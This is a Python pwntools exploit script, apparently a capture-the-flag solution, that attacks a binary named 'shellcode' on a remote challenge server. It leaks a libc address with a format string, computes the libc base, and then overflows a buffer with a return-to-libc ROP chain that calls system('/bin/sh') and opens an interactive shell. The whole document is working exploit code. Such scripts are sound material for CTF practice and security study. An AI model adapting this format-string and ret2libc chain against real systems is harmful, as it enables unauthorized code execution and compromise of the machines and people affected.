#!/usr/bin/env python3

from pwn import *

exe = ELF("shellcode", False)
libc = ELF("libc-2.23.so", False)

context.binary = exe
gdb_script = '''
b *main+45
b *main+270
b *main+280
c
'''

def conn():
    if args.LOCAL:
        r = process([exe.path])
        gdb.attach(r, gdb_script)	
    else:
        r = remote("challenge.utctf.live", 9009)

    return r


def main():
    r = conn()

    shellcode_addr = 0x7fffffffdbf0
    rax = 0x0000000000601040 # .data


    shellcode = asm(shellcraft.sh())
    
    format_string = b'\x25\x33\x24\x70'
    
    log.info(f"_IO_2_1_stdin_ offset @ {hex(libc.symbols['_IO_2_1_stdin_'])}")
    r.sendline(format_string + b"A"*44 + p64(rax) + b"A"*16 + p64(exe.sym.main))

    r.recvline()
    leak = r.recvline().strip().decode()
    leaked_part = leak.split('A')[0]


    leaked_address = int(leaked_part, 16)
    log.info(f"Leaked _IO_2_1_stdin_ @ {hex(leaked_address)}")
    
    libc.address = leaked_address - libc.symbols['_IO_2_1_stdin_']
    
    log.info(f"libc base @ {hex(libc.address)}")
    
   
    system_addr = libc.symbols.system
    bin_sh_addr = next(libc.search(b'/bin/sh\x00'))
    
    log.info(f"system @ {hex(system_addr)}")
    log.info(f"/bin/sh @ {hex(bin_sh_addr)}")
    
    pop_rdi_ret = 0x0000000000400793
    ret_gadget = 0x00000000004004a9
    
    payload = p64(pop_rdi_ret)
    payload += p64(bin_sh_addr)
    payload += p64(ret_gadget)  
    payload += p64(system_addr)
    
    r.sendline(b"A"*48 + p64(rax) + b"A"*16 + payload)   

    r.interactive()


if __name__ == "__main__":
    main()
